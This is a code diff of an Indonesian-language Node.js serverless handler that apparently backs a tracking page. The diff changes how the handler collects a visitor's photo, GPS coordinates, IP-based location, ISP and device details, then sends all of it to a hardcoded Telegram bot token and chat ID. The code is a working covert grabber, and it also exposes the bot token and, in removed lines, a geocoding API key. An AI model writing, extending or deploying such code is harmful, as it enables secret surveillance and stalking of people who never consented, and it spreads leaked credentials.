@@ -1,12 +1,10 @@
 import fetch from "node-fetch";
 import FormData from "form-data";
-import UAParser from "ua-parser-js"; // Pastikan sudah install: npm i ua-parser-js
-
-const OPENCAGE_KEY = "136e90f2e15c46fda280cbc59b05cfda"; // Ganti dengan API key kamu
+import UAParser from "ua-parser-js";
 
 export default async function handler(req, res) {
   try {
-    const { image, deviceInfo } = req.body;
+    const { image, deviceInfo, latitude, longitude } = req.body;
     const botToken = "8075080156:AAFhn7Wqxr-cxpvlSKdEFr1iL6qdOgWGwgw";
     const chatId = "6676770258";
 
@@ -18,41 +16,32 @@ export default async function handler(req, res) {
     const os = parser.getOS();
     const browser = parser.getBrowser();
 
-    // Dapatkan info IP dan lokasi
     const ipInfoRes = await fetch(`https://ipinfo.io/${ip}/json`);
     const ipInfo = await ipInfoRes.json();
 
-    const lokasi = `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`;
-    const isp = ipInfo.org || "Tidak diketahui";
+    const lokasi = ipInfo.city + ", " + ipInfo.region + ", " + ipInfo.country;
+    const isp = ipInfo.org || "Unknown ISP";
     const timezone = ipInfo.timezone || "Asia/Jakarta";
     const waktu = new Date().toLocaleString("id-ID", { timeZone: timezone });
 
-    const [lat, lon] = (ipInfo.loc || "").split(",");
-    let alamatLengkap = "Tidak tersedia";
-    if (lat && lon) {
-      const geoRes = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPENCAGE_KEY}`);
-      const geoData = await geoRes.json();
-      alamatLengkap = geoData?.results?.[0]?.formatted || "Tidak ditemukan";
-    }
-
-    const mapsLink = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : "Tidak tersedia";
+    const gmapsLink = (latitude && longitude)
+      ? `https://www.google.com/maps?q=${latitude},${longitude}`
+      : 'Tidak tersedia';
 
     const caption = `Dev By @FazrrEdan
 IP: ${ip}
 Lokasi: ${lokasi}
-Alamat: ${alamatLengkap}
 ISP: ${isp}
 Jam: ${waktu}
 
 Perangkat: ${device.model || "Tidak diketahui"}
 OS: ${os.name} ${os.version}
 Browser: ${browser.name} ${browser.version}
-
 Baterai: ${deviceInfo.batteryLevel}% (${deviceInfo.isCharging})
-RAM: ${deviceInfo.ram} GB
+RAM: ${deviceInfo.ram}
 Penyimpanan: ${deviceInfo.usedStorage} / ${deviceInfo.totalStorage}
-Koneksi: ${deviceInfo.connection}
-Maps: ${mapsLink}`;
+Google Maps: ${gmapsLink}
+`;
 
     const imageBuffer = Buffer.from(image.split(",")[1], "base64");
 
@@ -68,7 +57,6 @@ Maps: ${mapsLink}`;
     });
 
     const result = await telegram.json();
-    console.log(result);
     res.status(200).json({ success: true, result });
   } catch (error) {
     console.error("Gagal kirim ke Telegram:", error);
